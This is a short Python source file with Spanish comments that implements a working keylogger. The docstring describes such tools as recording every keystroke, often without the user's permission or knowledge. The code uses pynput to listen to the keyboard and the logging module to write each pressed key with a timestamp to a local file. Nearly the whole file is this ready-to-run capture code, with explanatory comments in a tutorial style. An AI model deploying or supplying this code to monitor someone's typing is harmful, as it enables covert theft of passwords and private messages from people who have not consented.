'''
Keylogger: realizan un seguimiento y registran cada tecla que se pulsa en una computadora, a menudo sin el permiso
ni el conocimiento del usuario.

--- Bibliotecas utilizadas ----
pynput: Más info: https://pypi.org/project/pynput/
logging: Más info: https://docs.python.org/es/3/howto/logging.html

En registro, nivel DEBUG: Información detallada, típicamente de interés solo durante el diagnóstico de problemas
'''

#IMPORTS
from pynput.keyboard import Key, Listener # librería que nos permite controlar y monitorizar dispositivos de entrada
import logging # rastreo de eventos al ejecutar un software, es decir, permite registrar eventos y mensajes
# en un programa

log_dir = "" # directorio donde vamos a guardar los logs

# MAIN

# Añadiendo un archivo para guardado de logs ----------------------------------------
logging.basicConfig(filename=(log_dir + "keylog_guardado.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s')
# %(asctime)s:%(message)s --> fecha + hora e información del evento

# Añadiendo el evento para su guardado ----------------------------------------------
def on_press(key):
    logging.info(str(key))

# Añadiendo el listener (escucha) de eventos ----------------------------------------
with Listener(on_press=on_press) as listener:
    listener.join()